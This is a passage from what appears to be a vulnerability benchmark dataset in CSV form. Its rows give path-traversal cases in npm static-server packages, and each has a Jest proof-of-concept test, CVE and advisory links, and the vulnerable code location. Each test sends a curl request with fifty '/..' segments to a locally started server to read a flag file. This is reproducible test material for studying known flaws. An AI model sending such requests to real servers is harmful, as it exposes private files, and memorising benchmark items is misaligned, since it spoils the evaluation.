  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:serverwg:20170511; https://github.com/advisories/GHSA-2f29-pmpx-vj62
path-traversal,,servewuqianqianqian,1.0.0,n/a,path-traversal/servewuqianqianqian_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in servewuqianqianqian"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/servewuqianqianqian/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:servewuqianqianqian:20180306; 
path-traversal,CVE-2018-3714,node-srv,2.0.0,2.1.1,path-traversal/node-srv_2.0.0,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in node-srv"", (done) => {
  expect.assertions(1);
  let Server = require(""node-srv"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let srv = new Server(
    {
      port: 8080,
      root: ""./"",
      logs: true,
    },
    function () {}
  );
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    srv.stop();
    done();
  });
});
",https://github.com/nim579/node-srv/commit/15be996c0520ac6e4dee0cf0808fc7e72effd2a2,lib/server.js:185:19,https://security.snyk.io/vuln/npm:node-srv:20180125; https://github.com/advisories/GHSA-52r9-g5g6-2hjp
path-traversal,,serverxh,1.0.0,n/a,path-traversal/serverxh_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverxh"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverxh/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:serverxh:20180226; 
path-traversal,,servershuai,1.2.0,n/a,path-traversal/servershuai_1.2.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in servershuai"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/servershuai/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:8:8,https://security.snyk.io/vuln/npm:servershuai:20180226; 
path-traversal,,angular-http-server,1.0.0,1.4.4,path-traversal/angular-http-server_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in angular-http-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/angular-http-server/angular-http-server.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",https://github.com/simonh1000/angular-http-server/commit/8bafc9577161469f5dea01e0b98ea9c525d063e9,angular-http-server.js:16:29,https://security.snyk.io/vuln/npm:angular-http-server:20180426; https://github.com/advisories/GHSA-4rvg-955w-h68q
path-traversal,,caolilinode1,1.0.0,n/a,path-traversal/caolilinode1_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in caolilinode1"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = "" node ./node_modules/caolilinode1/caolili.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,caolili.js:10:8,https://security.snyk.io/vuln/npm:caolilinode1:20180226; 
path-traversal,CVE-2018-16485,m-server,1.4.0,1.4.2,path-traversal/m-server_1.4.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 7000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in m-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 7000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/m-server/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:7000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",https://github.com/nunnly/m-server/commit/01f13f040d1961ca3146dce7e2db990156e65e9a,lib/index.js:14:28,https://security.snyk.io/vuln/npm:m-server:20180226; https://github.com/advisories/GHSA-899g-6q6w-7v94
path-traversal,,fakelearnnodejs,0.0.1,n/a,path-traversal/fakelearnnodejs_0.0.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 3000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in fakelearnnodejs"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 3000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/fakelearnnodejs/app.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:3000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,app.js:8:8,https://security.snyk.io/vuln/npm:fakelearnnodejs:20180226; 
path-traversal,CVE-2017-16159,caolilinode,1.0.0,n/a,path-traversal/caolilinode_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in caolilinode"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/caolilinode/caolili.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,caolili.js:7:8,https://security.snyk.io/vuln/npm:caolilinode:20170617; https://github.com/advisories/GHSA-2958-5r4r-wvv6
path-traversal,,wuzhuangserver,1.8.0,n/a,path-traversal/wuzhuangserver_1.8.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wuzhuangserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/wuzhuangserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:12:8,https://security.snyk.io/vuln/npm:wuzhuangserver:20180306; 
path-traversal,CVE-2017-16153,gaoxuyan,1.1.0,n/a,path-traversal/gaoxuyan_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in gaoxuyan"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/gaoxuyan/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:8:8,https://security.snyk.io/vuln/npm:gaoxuyan:20170505; https://github.com/advisories/GHSA-j9wj-26p5-fj2v
path-traversal,CVE-2020-7684,rollup-plugin-serve,0.4.2,n/a,path-traversal/rollup-plugin-serve_0.4.2,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in rollup-plugin-serve"", (done) => {
  expect.assertions(1);
  const server = require(""rollup-plugin-serve"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9000/tcp"", () => {});
  } catch (e) {}
  server({
    host: ""localhost"",
    port: 9000,
  });
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,dist/index.cjs.js:111:6,https://security.snyk.io/vuln/SNYK-JS-ROLLUPPLUGINSERVE-585897; https://github.com/advisories/GHSA-4j46-mp85-mv8c
path-traversal,CVE-2017-16156,myprolyz,1.1.0,n/a,path-traversal/myprolyz_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8889/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in myprolyz"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8889/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/myprolyz/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8889${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:9:8,https://security.snyk.io/vuln/npm:myprolyz:20170505; https://github.com/advisories/GHSA-pr8j-3v7m-j4vv
path-traversal,CVE-2017-16135,serverzyy,1.0.0,n/a,path-traversal/serverzyy_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverzyy"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverzyy/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
});
",n/a,index.js:8:8,https://security.snyk.io/vuln/npm:serverzyy:20170430; https://github.com/advisories/GHSA-pxq7-4ppw-qp7f
path-traversal,CVE-2017-16133,goserv,1.0.0,n/a,path-traversal/goserv_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in goserv"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/goserv/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,lib/goserv.js:63:9,https://security.snyk.io/vuln/npm:goserv:20170612; https://github.com/advisories/GHSA-pwqj-h62h-q35c
path-traversal,,severzlt,1.0.0,n/a,path-traversal/severzlt_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in severzlt"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/severzlt/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:9:8,https://security.snyk.io/vuln/npm:severzlt:20171006; 
path-traversal,,basic-static,2.0.2,n/a,path-traversal/basic-static_2.0.2,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in basic-static"", (done) => {
  expect.assertions(1);
  const basicStatic = require(""basic-static"");
  const serveStatic = basicStatic({
    rootDir: process.cwd(),
    compress: true,
  });
  const http = require(""http"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8999/tcp"", () => {});
  } catch (e) {}
  const server = http.createServer(function (req, res) {
    serveStatic(req, res);
  });
  server.listen(8999);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8999${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,basic-static.js:121:21,https://security.snyk.io/vuln/npm:basic-static:20180226; 
path-traversal,,node-static-webserver,0.0.1,n/a,path-traversal/node-static-webserver_0.0.1,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in node-static-webserver"", (done) => {
  expect.assertions(1);
  const pkg = require(""node-static-webserver"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8984/tcp"", () => {});
  } catch (e) {}
  new pkg(__dirname, 8984, ""127.0.0.1"");
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8984${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,node-static-webserver.js:79:25,https://security.snyk.io/vuln/npm:node-static-webserver:20180226; 
path-traversal,CVE-2019-5444,serve-here.js,1.1.0,1.2.0,path-traversal/serve-here.js_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serve-here.js"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serve-here.js/bin/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",https://github.com/ChristoPy/serve-here.js/commit/cefb51d03290b6a88dd13143ab2de31b8cf57c39,source/server.js:27:15,https://security.snyk.io/vuln/SNYK-JS-SERVEHEREJS-450884; https://github.com/advisories/GHSA-4448-rc82-fcr7
path-traversal,CVE-2019-5447,http-file-server,0.2.6,n/a,path-traversal/http-file-server_0.2.6,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in http-file-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/http-file-server/http-file-server.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,http-file-server.js:200:22,https://security.snyk.io/vuln/SNYK-JS-HTTPFILESERVER-451564; https://github.com/advisories/GHSA-2mp5-m968-gwr2
path-traversal,,ussasasa,1.0.0,n/a,path-traversal/ussasasa_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in ussasasa"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/ussasasa/index.js"";
  exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:8:8,https://security.snyk.io/vuln/npm:ussasasa:20180226; 
path-traversal,CVE-2017-16180,serverabc,1.0.0,n/a,path-traversal/serverabc_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverabc"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverabc/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:9:8,https://security.snyk.io/vuln/npm:serverabc:20170518; https://github.com/advisories/GHSA-pr49-5hhf-6mm6
path-traversal,CVE-2017-16122,cuciuci,1.1.0,n/a,path-traversal/cuciuci_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in cuciuci"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/cuciuci/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:7:8,https://security.snyk.io/vuln/npm:cuciuci:20170511; https://github.com/advisories/GHSA-w3cg-6577-wx9f
path-traversal,CVE-2017-16190,dcdcdcdcdc,1.0.0,n/a,path-traversal/dcdcdcdcdc_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in dcdcdcdcdc"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/dcdcdcdcdc/node.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,node.js:9:8,https://security.snyk.io/vuln/npm:dcdcdcdcdc:20170617; https://github.com/advisories/GHSA-8vmc-g99q-xj94
path-traversal,CVE-2017-16199,susu-sum,1.0.0,n/a,path-traversal/susu-sum_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in susu-sum"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/susu-sum/node.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,node.js:5:8,https://security.snyk.io/vuln/npm:susu-sum:20170617; https://github.com/advisories/GHSA-w7jg-972m-rphv
path-traversal,CVE-2017-16213,mfrserver,1.0.0,n/a,path-traversal/mfrserver_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in mfrserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/mfrserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:6:8,https://security.snyk.io/vuln/npm:mfrserver:20170505; https://github.com/advisories/GHSA-p2r2-h92r-w2mg
path-traversal,,serveryyl,1.1.0,n/a,path-traversal/serveryyl_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
